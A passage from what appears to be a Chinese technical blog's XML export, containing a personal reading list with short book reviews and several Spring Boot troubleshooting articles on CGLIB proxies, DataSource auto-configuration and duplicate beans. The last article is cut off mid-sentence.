    <content type="text"><![CDATA[文科类古董局中局 4https://book.douban.com/subject/26650970/ 马伯庸作品，这一系列都很好看，最后一集略不足，有点圆不上的感觉。深夜看有点吓人。 解读中国经济https://book.douban.com/subject/11626951/ 林毅夫的作品，了解到经济政策制定者，或者叫参与者的一些想法，比如新农村，比较接地气。但是回过头来看，任何一项政策都有它的不足，最终落实效果和最初的设计都会有差距。 中国历代政治得失https://book.douban.com/subject/1003479/ 钱穆的作品，可以了解到各个朝代的政治制度是怎样的，不同官位的功能。先看的《历代经济变革得失》，再看的这本书，实际上应该反过来。 历代经济变革得失https://book.douban.com/subject/24851460/ 印象比较深的是说儒家一心想治国平天下，开万世之太平。但是历史上经济改革做得好的人却不是儒家。儒家一心只稳定，并没有有效的经济发展手段。尽管说得有点重，但是在经济上儒家的确没什么作为。 巨流河https://book.douban.com/subject/5914484/ 前国民党高官的女儿的自传，前面的内容相对大气，后面的内容就有点虚了。可以看到台湾文人的一些状态。作者居然很少写到她的丈夫还有家人，不知道是什么心态。一位老人到了暮年仍是意难平。 失乐园https://book.douban.com/subject/25891771/ 渡边淳一的作品，只记得是两个人偷情的作品，写得很细腻。 人民的名义书没有想像中好看，可能电视剧更精彩点，尽管电视剧只看了部分。 三体重新读了一遍。 理工科类众病之王：癌症传https://book.douban.com/subject/20507206/ 这本书详细写了癌症的起因，人们认知的历史，治疗方法的原理，治疗方法的发展史，是非常值得一读的书。认真读了的话，自然会对癌症心里有数，不会受到各种流言的困扰，对自己和身边的人都有好处。 医学的真相https://book.douban.com/subject/26844088/ 作者以医生的角度，谈了一些自己对医学的看法或者叫真相。了解医学的人会认同作者的观点，有的人会觉得无聊。这本书可以说是作者的真心剖析，但是评分却比不上《众病之王》。人们对于自己利害相关的会比较关心，非自己利害相关的就比较冷淡了。 进化心理学https://book.douban.com/subject/26683297/ 一开始以为这本书是跟风的，放在书架上很久了，真正读了才知道是一本好书。 进化心理学是一本真正的科学，它是提出假设，再验证的科学。它能解析很多现象，比如外婆为什么会比爷爷更喜欢你。 未来简史https://book.douban.com/subject/26943161/ 《人类简史》作者的续作。其实我觉得名字并不是很准确，只能说是作者对未来的看法，并不能说是历史。 这本书和《人类简史》一样，是作者集很多前人的想法的大成。从作者对计算机的一些描述来看，作者并非所有学科都精通。 地球上最伟大的表演https://book.douban.com/subject/20507207/ 翻译不是很好。有一些例子比较好，比如人为的选育，其实可以让物种进化非常快，比一般人的想像的要快得多。 万万没想到：用理工科思维理解世界https://book.douban.com/subject/25986341/ 博客的合集，后面的很多内容是凑数的。不过从里面找到了一些书来读，还行。 读书软件相关 书都是在手机上读的 绝大部分格式是epub，少量是pdf 大部分书是在多看上看的 网易的锅牛每天可以免费读书一个小时，就是书籍数量比较少 总结 读的书没想像中的多，很多时候想写点笔记却没有动手 下了今日读条之后，读书时间变少了……考虑是否要卸载掉 还有一些技术书和乱七八糟的小说没有记录 进化相关的书比较多，看书范围需要扩展]]></content>
      <categories>
        <category>读书</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：排查@Transactional引起的NullPointerException]]></title>
    <url>%2Fspring-boot-transactional-nullpointerexception%2F</url>
    <content type="text"><![CDATA[写在前面这个demo来说明怎么排查一个@Transactional引起的NullPointerException。 https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-Transactional-NullPointerException 定位 NullPointerException 的代码Demo是一个简单的spring事务例子，提供了下面一个StudentDao，并用@Transactional来声明事务： 123456789101112131415@Component@Transactionalpublic class StudentDao &#123; @Autowired private SqlSession sqlSession; public Student selectStudentById(long id) &#123; return sqlSession.selectOne("selectStudentById", id); &#125; public final Student finalSelectStudentById(long id) &#123; return sqlSession.selectOne("selectStudentById", id); &#125;&#125; 应用启动后，会依次调用selectStudentById和finalSelectStudentById： 12345@PostConstructpublic void init() &#123; studentDao.selectStudentById(1); studentDao.finalSelectStudentById(1);&#125; 用mvn spring-boot:run 或者把工程导入IDE里启动，抛出来的异常信息是： 123456789Caused by: java.lang.NullPointerException at sample.mybatis.dao.StudentDao.finalSelectStudentById(StudentDao.java:27) at com.example.demo.transactional.nullpointerexception.DemoNullPointerExceptionApplication.init(DemoNullPointerExceptionApplication.java:30) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:366) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:311) 为什么应用代码里执行selectStudentById没有问题，而执行finalSelectStudentById就抛出NullPointerException? 同一个bean里，明明SqlSession sqlSession已经被注入了，在selectStudentById里它是非null的。为什么finalSelectStudentById函数里是null？ 获取实际运行时的类名当然，我们对比两个函数，可以知道是因为finalSelectStudentById的修饰符是final。但是具体原因是什么呢？ 我们先在抛出异常的地方打上断点，调试代码，获取到具体运行时的class是什么： 1System.err.println(studentDao.getClass()); 打印的结果是： 1class sample.mybatis.dao.StudentDao$$EnhancerBySpringCGLIB$$210b005d 可以看出是一个被spring aop处理过的类，但是它的具体字节码内容是什么呢？ dumpclass分析我们使用dumpclass工具来把jvm里的类dump出来： https://github.com/hengyunabc/dumpclass 1wget http://search.maven.org/remotecontent?filepath=io/github/hengyunabc/dumpclass/0.0.1/dumpclass-0.0.1.jar -O dumpclass.jar 找到java进程pid： 12$ jps5907 DemoNullPointerExceptionApplication 把相关的类都dump下来： 1sudo java -jar dumpclass.jar 5907 &apos;sample.mybatis.dao.StudentDao*&apos; /tmp/dumpresult 反汇编分析用javap或者图形化工具jd-gui来反编绎sample.mybatis.dao.StudentDao$$EnhancerBySpringCGLIB$$210b005d。 反编绎后的结果是： class StudentDao$$EnhancerBySpringCGLIB$$210b005d extends StudentDao StudentDao$$EnhancerBySpringCGLIB$$210b005d里没有finalSelectStudentById相关的内容 selectStudentById实际调用的是this.CGLIB$CALLBACK_0，即MethodInterceptor tmp4_1，等下我们实际debug，看具体的类型 1234567891011121314151617181920212223242526272829303132public final Student selectStudentById(long paramLong)&#123; try &#123; MethodInterceptor tmp4_1 = this.CGLIB$CALLBACK_0; if (tmp4_1 == null) &#123; tmp4_1; CGLIB$BIND_CALLBACKS(this); &#125; MethodInterceptor tmp17_14 = this.CGLIB$CALLBACK_0; if (tmp17_14 != null) &#123; Object[] tmp29_26 = new Object[1]; Long tmp35_32 = new java/lang/Long; Long tmp36_35 = tmp35_32; tmp36_35; tmp36_35.&lt;init&gt;(paramLong); tmp29_26[0] = tmp35_32; return (Student)tmp17_14.intercept(this, CGLIB$selectStudentById$0$Method, tmp29_26, CGLIB$selectStudentById$0$Proxy); &#125; return super.selectStudentById(paramLong); &#125; catch (RuntimeException|Error localRuntimeException) &#123; throw localRuntimeException; &#125; catch (Throwable localThrowable) &#123; throw new UndeclaredThrowableException(localThrowable); &#125;&#125; 再来实际debug，尽管StudentDao$$EnhancerBySpringCGLIB$$210b005d的代码不能直接看到，但是还是可以单步执行的。 在debug时，可以看到 StudentDao$$EnhancerBySpringCGLIB$$210b005d里的所有field都是null this.CGLIB$CALLBACK_0的实际类型是CglibAopProxy$DynamicAdvisedInterceptor，在这个Interceptor里实际保存了原始的target对象 CglibAopProxy$DynamicAdvisedInterceptor在经过TransactionInterceptor处理之后，最终会用反射调用自己保存的原始target对象 抛出异常的原因所以整理下整个分析： 在使用了@Transactional之后，spring aop会生成一个cglib代理类，实际用户代码里@Autowired注入的StudentDao也是这个代理类的实例 cglib生成的代理类StudentDao$$EnhancerBySpringCGLIB$$210b005d继承自StudentDao StudentDao$$EnhancerBySpringCGLIB$$210b005d里的所有field都是null StudentDao$$EnhancerBySpringCGLIB$$210b005d在调用selectStudentById，实际上通过CglibAopProxy$DynamicAdvisedInterceptor，最终会用反射调用自己保存的原始target对象 所以selectStudentById函数的调用没有问题 那么为什么finalSelectStudentById函数里的SqlSession sqlSession会是null，然后抛出NullPointerException？ StudentDao$$EnhancerBySpringCGLIB$$210b005d里的所有field都是null finalSelectStudentById函数的修饰符是final，cglib没有办法重写这个函数 当执行到finalSelectStudentById里，实际执行的是原始的StudentDao里的代码 但是对象是StudentDao$$EnhancerBySpringCGLIB$$210b005d的实例，它里面的所有field都是null，所以会抛出NullPointerException 解决问题办法 最简单的当然是把finalSelectStudentById函数的final修饰符去掉 还有一种办法，在StudentDao里不要直接使用sqlSession，而通过getSqlSession()函数，这样cglib也会处理getSqlSession()，返回原始的target对象 总结 排查问题多debug，看实际运行时的对象信息 对于cglib生成类的字节码，可以用dumpclass工具来dump，再反编绎分析]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：排查 Cannot determine embedded database driver class for database type NONE]]></title>
    <url>%2Fspring-boot-database-type-none%2F</url>
    <content type="text"><![CDATA[写在前面这个demo来说明怎么一步步排查一个常见的spring boot AutoConfiguration的错误。 https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-database-type-NONE 调试排查 Cannot determine embedded database driver class for database type NONE 的错误把工程导入IDE里，直接启动应用，抛出来的异常信息是： 123456789101112131415Error starting ApplicationContext. To display the auto-configuration report re-run your application with &apos;debug&apos; enabled.2017-11-29 14:26:34.478 ERROR 29736 --- [ main] o.s.b.d.LoggingFailureAnalysisReporter :***************************APPLICATION FAILED TO START***************************Description:Cannot determine embedded database driver class for database type NONEAction:If you want an embedded database please put a supported one on the classpath. If you have database settings to be loaded from a particular profile you may need to active it (no profiles are currently active). 其实这时有两个思路，直接google搜索Cannot determine embedded database driver class for database type NONE，就可以找到解决办法。 第二种方式，仔细查看日志内容，可以发现有To display the auto-configuration report re-run your application with &#39;debug&#39; enabled.。 搜索下这个，就可以在spring的官方网站上找到相关的信息：https://docs.spring.io/spring-boot/docs/current/reference/html/using-boot-auto-configuration.html 就是用户只要配置了debug这个开关，就会把auto-configuration 相关的信息打印出来。 熟悉spring的环境变量注入的话，就可以知道有几种打开这个的方式： 在args里增加--debug 在application.properties里增加debug=true 通过-Ddebug=true 增加debug开关之后的信息增加debug开关之后，可以看到打印出了错误堆栈： 123456782017-11-29 14:33:08.776 DEBUG 29907 --- [ main] o.s.b.d.LoggingFailureAnalysisReporter : Application failed to start due to an exceptionorg.springframework.boot.autoconfigure.jdbc.DataSourceProperties$DataSourceBeanCreationException: Cannot determine embedded database driver class for database type NONE. If you want an embedded database please put a supported one on the classpath. If you have database settings to be loaded from a particular profile you may need to active it (no profiles are currently active). at org.springframework.boot.autoconfigure.jdbc.DataSourceProperties.determineDriverClassName(DataSourceProperties.java:245) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE] at org.springframework.boot.autoconfigure.jdbc.DataSourceProperties.initializeDataSourceBuilder(DataSourceProperties.java:182) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE] at org.springframework.boot.autoconfigure.jdbc.DataSourceConfiguration.createDataSource(DataSourceConfiguration.java:42) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE] at org.springframework.boot.autoconfigure.jdbc.DataSourceConfiguration$Tomcat.dataSource(DataSourceConfiguration.java:53) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_112] 抛出异常的代码是： 123456789101112131415161718192021222324252627/** * Determine the driver to use based on this configuration and the environment. * @return the driver to use * @since 1.4.0 */public String determineDriverClassName() &#123; if (StringUtils.hasText(this.driverClassName)) &#123; Assert.state(driverClassIsLoadable(), "Cannot load driver class: " + this.driverClassName); return this.driverClassName; &#125; String driverClassName = null; if (StringUtils.hasText(this.url)) &#123; driverClassName = DatabaseDriver.fromJdbcUrl(this.url).getDriverClassName(); &#125; if (!StringUtils.hasText(driverClassName)) &#123; driverClassName = this.embeddedDatabaseConnection.getDriverClassName(); &#125; if (!StringUtils.hasText(driverClassName)) &#123; throw new DataSourceBeanCreationException(this.embeddedDatabaseConnection, this.environment, "driver class"); &#125; return driverClassName;&#125; 可以看出来是没有找到 DataSource 的driver class，然后抛出了 DataSourceBeanCreationException。 那么一种解决办法是，在maven依赖里加入一些 DataSource driver class。 但是应用自己的代码里并没有使用DataSource，哪里导致spring boot要创建一个DataSource对象？ 哪里导致spring boot要创建DataSource从异常栈上，可以找到DataSourceConfiguration$Tomcat 这个类，那么查找下它的引用，可以发现它是被org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration.PooledDataSourceConfiguration import引入的。 123456789@Configuration@Conditional(PooledDataSourceCondition.class)@ConditionalOnMissingBean(&#123; DataSource.class, XADataSource.class &#125;)@Import(&#123; DataSourceConfiguration.Tomcat.class, DataSourceConfiguration.Hikari.class, DataSourceConfiguration.Dbcp.class, DataSourceConfiguration.Dbcp2.class, DataSourceConfiguration.Generic.class &#125;)protected static class PooledDataSourceConfiguration &#123;&#125; 那么 PooledDataSourceConfiguration 是怎么生效的呢？从代码上可以看到@Conditional(PooledDataSourceCondition.class)。 那么再看PooledDataSourceCondition的具体实现： 123456789101112131415161718192021/** * &#123;@link AnyNestedCondition&#125; that checks that either &#123;@code spring.datasource.type&#125; * is set or &#123;@link PooledDataSourceAvailableCondition&#125; applies. */static class PooledDataSourceCondition extends AnyNestedCondition &#123; PooledDataSourceCondition() &#123; super(ConfigurationPhase.PARSE_CONFIGURATION); &#125; @ConditionalOnProperty(prefix = "spring.datasource", name = "type") static class ExplicitType &#123; &#125; @Conditional(PooledDataSourceAvailableCondition.class) static class PooledDataSourceAvailable &#123; &#125;&#125; PooledDataSourceCondition引入了@Conditional(PooledDataSourceAvailableCondition.class) ： 12345678910111213141516171819202122232425262728293031/** * &#123;@link Condition&#125; to test if a supported connection pool is available. */static class PooledDataSourceAvailableCondition extends SpringBootCondition &#123; @Override public ConditionOutcome getMatchOutcome(ConditionContext context, AnnotatedTypeMetadata metadata) &#123; ConditionMessage.Builder message = ConditionMessage .forCondition("PooledDataSource"); if (getDataSourceClassLoader(context) != null) &#123; return ConditionOutcome .match(message.foundExactly("supported DataSource")); &#125; return ConditionOutcome .noMatch(message.didNotFind("supported DataSource").atAll()); &#125; /** * Returns the class loader for the &#123;@link DataSource&#125; class. Used to ensure that * the driver class can actually be loaded by the data source. * @param context the condition context * @return the class loader */ private ClassLoader getDataSourceClassLoader(ConditionContext context) &#123; Class&lt;?&gt; dataSourceClass = new DataSourceBuilder(context.getClassLoader()) .findType(); return (dataSourceClass == null ? null : dataSourceClass.getClassLoader()); &#125;&#125; 从代码里，可以看到是尝试查找dataSourceClass，如果找到，条件就成立。那么debug下，可以发现查找到的dataSourceClass是：org.apache.tomcat.jdbc.pool.DataSource 。 那么再看下org.apache.tomcat.jdbc.pool.DataSource这个类是从哪里来的呢？ 从maven依赖树可以看到，依赖是来自：spring-boot-starter-jdbc。所以是应用依赖了spring-boot-starter-jdbc，但是并没有配置DataSource引起的问题。 问题解决办法有两种： 没有使用到DataSource，则可以把spring-boot-starter-jdbc的依赖去掉，这样就不会触发spring boot相关的代码 把spring boot自动初始化DataSource相关的代码禁止掉 禁止的办法有两种： 在main函数上配置exclude 1@SpringBootApplication(exclude = &#123; DataSourceAutoConfiguration.class, DataSourceTransactionManagerAutoConfiguration.class &#125;) 在application.properties里配置： 1spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration 总结 应用没有使用到DataSource，但是在pom.xml里引入了spring-boot-starter-jdbc spring-boot-starter-jdbc带入了tomcat-jdbc，它里面有org.apache.tomcat.jdbc.pool.DataSource spring boot里的PooledDataSourceConfiguration，判断classpath下面有DataSource的实现类，尝试去创建DataSource bean 在初始化DataSourceProperties时，尝试通过jdbc的url来探测driver class 因为应用并没有配置url，所以最终在DataSourceProperties.determineDriverClassName()里抛出Cannot determine embedded database driver class for database type NONE 最后： 排查spring boot的AutoConfiguration问题时，可以按异常栈，一层层排查Configuration是怎么引入的，再排查Condition具体的判断代码。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：排查expected single matching bean but found 2的异常]]></title>
    <url>%2Fspring-boot-expected-single-but-found-2%2F</url>
    <content type="text"><![CDATA[写在前面这个demo来说明怎么排查一个常见的spring expected single matching bean but found 2的异常。 https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-expected-single 调试排查 expected single matching bean but found 2 的错误把工程导入IDE里，直接启动应用，抛出来的异常信息是： 1234567891011121314Caused by: org.springframework.beans.factory.NoUniqueBeanDefinitionException: No qualifying bean of type &apos;javax.sql.DataSource&apos; available: expected single matching bean but found 2: h2DataSource1,h2DataSource2 at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveNamedBean(DefaultListableBeanFactory.java:1041) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:345) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:340) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE] at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1090) ~[spring-context-4.3.9.RELEASE.jar:4.3.9.RELEASE] at org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.init(DataSourceInitializer.java:71) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_112] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_112] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_112] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_112] at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:366) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE] at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:311) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE] at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:134) ~[spring-beans-4.3.9.RELEASE.jar:4.3.9.RELEASE] ... 30 common frames omitted 很多人碰到这种错误时，就乱配置一通，找不到下手的办法。其实耐心排查下，是很简单的。 抛出异常的原因异常信息写得很清楚了，在spring context里需要注入/获取到一个DataSource bean，但是现在spring context里出现了两个，它们的名字是：h2DataSource1,h2DataSource2 那么有两个问题： 应用是在哪里要注入/获取到一个DataSource bean？ h2DataSource1,h2DataSource2 是在哪里定义的？ 使用 Java Exception Breakpoint在IDE里，新建一个断点，类型是Java Exception Breakpoint（如果不清楚怎么添加，可以搜索对应IDE的使用文档），异常类是上面抛出来的NoUniqueBeanDefinitionException。 当断点停住时，查看栈，可以很清楚地找到是在DataSourceInitializer.init() line: 71这里要获取DataSource： 123456789101112131415161718192021222324252627282930313233343536373839404142434445Thread [main] (Suspended (exception NoUniqueBeanDefinitionException)) owns: ConcurrentHashMap&lt;K,V&gt; (id=49) owns: Object (id=50) DefaultListableBeanFactory.resolveNamedBean(Class&lt;T&gt;, Object...) line: 1041 DefaultListableBeanFactory.getBean(Class&lt;T&gt;, Object...) line: 345 DefaultListableBeanFactory.getBean(Class&lt;T&gt;) line: 340 AnnotationConfigEmbeddedWebApplicationContext(AbstractApplicationContext).getBean(Class&lt;T&gt;) line: 1090 DataSourceInitializer.init() line: 71 NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method] NativeMethodAccessorImpl.invoke(Object, Object[]) line: 62 DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43 Method.invoke(Object, Object...) line: 498 InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(Object) line: 366 InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(Object, String) line: 311 CommonAnnotationBeanPostProcessor(InitDestroyAnnotationBeanPostProcessor).postProcessBeforeInitialization(Object, String) line: 134 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).applyBeanPostProcessorsBeforeInitialization(Object, String) line: 409 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).initializeBean(String, Object, RootBeanDefinition) line: 1620 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).doCreateBean(String, RootBeanDefinition, Object[]) line: 555 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).createBean(String, RootBeanDefinition, Object[]) line: 483 AbstractBeanFactory$1.getObject() line: 306 DefaultListableBeanFactory(DefaultSingletonBeanRegistry).getSingleton(String, ObjectFactory&lt;?&gt;) line: 230 DefaultListableBeanFactory(AbstractBeanFactory).doGetBean(String, Class&lt;T&gt;, Object[], boolean) line: 302 DefaultListableBeanFactory(AbstractBeanFactory).getBean(String, Class&lt;T&gt;, Object...) line: 220 DefaultListableBeanFactory.resolveNamedBean(Class&lt;T&gt;, Object...) line: 1018 DefaultListableBeanFactory.getBean(Class&lt;T&gt;, Object...) line: 345 DefaultListableBeanFactory.getBean(Class&lt;T&gt;) line: 340 DataSourceInitializerPostProcessor.postProcessAfterInitialization(Object, String) line: 62 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).applyBeanPostProcessorsAfterInitialization(Object, String) line: 423 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).initializeBean(String, Object, RootBeanDefinition) line: 1633 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).doCreateBean(String, RootBeanDefinition, Object[]) line: 555 DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).createBean(String, RootBeanDefinition, Object[]) line: 483 AbstractBeanFactory$1.getObject() line: 306 DefaultListableBeanFactory(DefaultSingletonBeanRegistry).getSingleton(String, ObjectFactory&lt;?&gt;) line: 230 DefaultListableBeanFactory(AbstractBeanFactory).doGetBean(String, Class&lt;T&gt;, Object[], boolean) line: 302 DefaultListableBeanFactory(AbstractBeanFactory).getBean(String) line: 197 DefaultListableBeanFactory.preInstantiateSingletons() line: 761 AnnotationConfigEmbeddedWebApplicationContext(AbstractApplicationContext).finishBeanFactoryInitialization(ConfigurableListableBeanFactory) line: 867 AnnotationConfigEmbeddedWebApplicationContext(AbstractApplicationContext).refresh() line: 543 AnnotationConfigEmbeddedWebApplicationContext(EmbeddedWebApplicationContext).refresh() line: 122 SpringApplication.refresh(ApplicationContext) line: 762 SpringApplication.refreshContext(ConfigurableApplicationContext) line: 372 SpringApplication.run(String...) line: 316 SpringApplication.run(Object[], String[]) line: 1187 SpringApplication.run(Object, String...) line: 1176 DemoExpectedSingleApplication.main(String[]) line: 17 定位哪里要注入/使用DataSource要获取DataSource具体的代码是： 1234567891011121314151617//org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.init() @PostConstruct public void init() &#123; if (!this.properties.isInitialize()) &#123; logger.debug("Initialization disabled (not running DDL scripts)"); return; &#125; if (this.applicationContext.getBeanNamesForType(DataSource.class, false, false).length &gt; 0) &#123; this.dataSource = this.applicationContext.getBean(DataSource.class); &#125; if (this.dataSource == null) &#123; logger.debug("No DataSource found so not initializing"); return; &#125; runSchemaScripts(); &#125; this.applicationContext.getBean(DataSource.class); 要求spring context里只有一个DataSource的bean，但是应用里有两个，所以抛出了NoUniqueBeanDefinitionException。 从BeanDefinition获取bean具体定义的代码我们再来看 h2DataSource1,h2DataSource2 是在哪里定义的？ 上面进程断在了DefaultListableBeanFactory.resolveNamedBean(Class&lt;T&gt;, Object...) 函数里的 throw new NoUniqueBeanDefinitionException(requiredType, candidates.keySet()); 这一行。 那么我们在这里执行一下（如果不清楚，先搜索下IDE怎么在断点情况下执行代码）： 1this.getBeanDefinition("h2DataSource1") 返回的信息是： 12Root bean: class [null]; scope=; abstract=false; lazyInit=false; autowireMode=3; dependencyCheck=0; autowireCandidate=true; primary=false; factoryBeanName=demoExpectedSingleApplication; factoryMethodName=h2DataSource1; initMethodName=null; destroyMethodName=(inferred);defined in com.example.demo.expected.single.DemoExpectedSingleApplication 可以很清楚地定位到h2DataSource1这个bean是在 com.example.demo.expected.single.DemoExpectedSingleApplication里定义的。 所以上面两个问题的答案是： 是spring boot代码里的DataSourceInitializer.init() line: 71这里要获取DataSource，并且只允许有一个DataSource实例 h2DataSource1,h2DataSource2 是在com.example.demo.expected.single.DemoExpectedSingleApplication里定义的 解决问题上面排查到的原因是：应用定义了两个DataSource实例，但是spring boot却要求只有一个。那么有两种办法来解决： 使用@Primary来指定一个优先使用的DataSource，这样子spring boot里自动初始的代码会获取到@Primary的bean 把spring boot自动初始化DataSource相关的代码禁止掉，应用自己来控制所有的DataSource相关的bean 禁止的办法有两种： 在main函数上配置exclude 1@SpringBootApplication(exclude = &#123; DataSourceAutoConfiguration.class, DataSourceTransactionManagerAutoConfiguration.class &#125;) 在application.properties里配置： 1spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration 总结 排查spring初始化问题时，灵活使用Java Exception Breakpoint 从异常栈上，可以很容易找到哪里要注入/使用bean 从BeanDefinition可以找到bean是在哪里定义的（哪个Configuration类/xml）]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：Spring Context的继承关系和影响]]></title>
    <url>%2Fspring-boot-context%2F</url>
    <content type="text"><![CDATA[前言对于一个简单的Spring boot应用，它的spring context是只会有一个。 非web spring boot应用，context是AnnotationConfigApplicationContext web spring boot应用，context是AnnotationConfigEmbeddedWebApplicationContext AnnotationConfigEmbeddedWebApplicationContext是spring boot里自己实现的一个context，主要功能是启动embedded servlet container，比如tomcat/jetty。 这个和传统的war包应用不一样，传统的war包应用有两个spring context。参考：http://hengyunabc.github.io/something-about-spring-mvc-webapplicationcontext/ 但是对于一个复杂点的spring boot应用，它的spring context可能会是多个，下面分析下各种情况。 Demo这个Demo展示不同情况下的spring boot context的继承情况。 https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-classloader-context 配置spring boot actuator/endpoints独立端口时spring boot actuator默认情况下和应用共用一个tomcat，这样子的话就会直接把应用的endpoints暴露出去，带来很大的安全隐患。 尽管 Spring boot后面默认把这个关掉，需要配置management.security.enabled=false才可以访问，但是这个还是太危险了。 所以通常都建议把endpoints开在另外一个独立的端口上，比如 management.port=8081。 可以增加-Dspring.cloud.bootstrap.enabled=false，来禁止spring cloud，然后启动Demo。比如 1mvn spring-boot:run -Dspring.cloud.bootstrap.enabled=false 然后打开 http://localhost:8080/ 可以看到应用的spring context继承结构。 打开 http://localhost:8081/contexttree 可以看到Management Spring Contex的继承结构。 可以看到当配置management独立端口时，management context的parent是应用的spring context 相关的实现代码在 org.springframework.boot.actuate.autoconfigure.EndpointWebMvcAutoConfiguration 里 在sprig cloud环境下spring context的情况在有spring cloud时（通常是引入 spring-cloud-starter），因为spring cloud有自己的一套配置初始化机制，所以它实际上是自己启动了一个Spring context，并把自己置为应用的context的parent。 spring cloud context的启动代码在org.springframework.cloud.bootstrap.BootstrapApplicationListener里。 spring cloud context实际上是一个特殊的spring boot context，它只扫描BootstrapConfiguration。 123456789101112131415ClassLoader classLoader = Thread.currentThread().getContextClassLoader();// Use names and ensure unique to protect against duplicatesList&lt;String&gt; names = SpringFactoriesLoader .loadFactoryNames(BootstrapConfiguration.class, classLoader);for (String name : StringUtils.commaDelimitedListToStringArray( environment.getProperty("spring.cloud.bootstrap.sources", ""))) &#123; names.add(name);&#125;// TODO: is it possible or sensible to share a ResourceLoader?SpringApplicationBuilder builder = new SpringApplicationBuilder() .profiles(environment.getActiveProfiles()).bannerMode(Mode.OFF) .environment(bootstrapEnvironment) .properties("spring.application.name:" + configName) .registerShutdownHook(false).logStartupInfo(false).web(false);List&lt;Class&lt;?&gt;&gt; sources = new ArrayList&lt;&gt;(); 最终会把这个ParentContextApplicationContextInitializer加到应用的spring context里，来把自己设置为应用的context的parent。 1234567891011public class ParentContextApplicationContextInitializer implements ApplicationContextInitializer&lt;ConfigurableApplicationContext&gt;, Ordered &#123; private int order = Ordered.HIGHEST_PRECEDENCE; private final ApplicationContext parent; @Override public void initialize(ConfigurableApplicationContext applicationContext) &#123; if (applicationContext != this.parent) &#123; applicationContext.setParent(this.parent); applicationContext.addApplicationListener(EventPublisher.INSTANCE); &#125; &#125; 和上面一样，直接启动demo，不要配置-Dspring.cloud.bootstrap.enabled=false，然后访问对应的url，就可以看到spring context的继承情况。 如何在应用代码里获取到 Management Spring Context如果应用代码想获取到Management Spring Context，可以通过这个bean：org.springframework.boot.actuate.autoconfigure.ManagementContextResolver spring boot在创建Management Spring 